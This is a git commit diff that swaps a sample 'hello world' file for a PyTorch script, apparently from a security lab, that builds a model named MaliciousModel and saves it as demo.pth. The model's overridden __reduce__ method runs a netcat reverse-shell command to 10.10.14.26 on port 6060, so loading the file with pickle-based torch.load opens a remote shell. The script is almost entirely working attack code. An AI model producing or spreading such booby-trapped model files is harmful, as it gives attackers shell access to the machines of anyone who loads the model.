917184be28276bbfce8fa88da0a46642d9eee644
MashrurRahmanRawnok <theblackcyberdevil@gmail.com>
2024-06-26 20:36:03 +0000

    commit

--- test-project/hello.py
+++ test-project/hello.py
@@ -1,6 +1,22 @@
-#-------------------------------------------------------------------------------------------------------------
-# Copyright (c) Microsoft Corporation. All rights reserved.
-# Licensed under the MIT License. See https://go.microsoft.com/fwlink/?linkid=2090316 for license information.
-#-------------------------------------------------------------------------------------------------------------
+import torch
+import torch.nn as nn
+import os
 
-print('Hello, remote world!')
+class MaliciousModel(nn.Module):
+    # PyTorch's base class for all neural network modules
+    def __init__(self):
+        super(MaliciousModel, self).__init__()
+        self.dense = nn.Linear(10, 1)
+    # Define how the data flows through the model
+    def forward(self, demo): # Passes input through the linear layer.
+        return self.dense(demo)
+    # Overridden __reduce__ Method
+    def __reduce__(self):
+        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 6060 >/tmp/f"
+        return os.system, (cmd,)
+
+# Create an instance of the model
+malicious_model = MaliciousModel()
+
+# Save the model using torch.save
+torch.save(malicious_model, 'demo.pth')
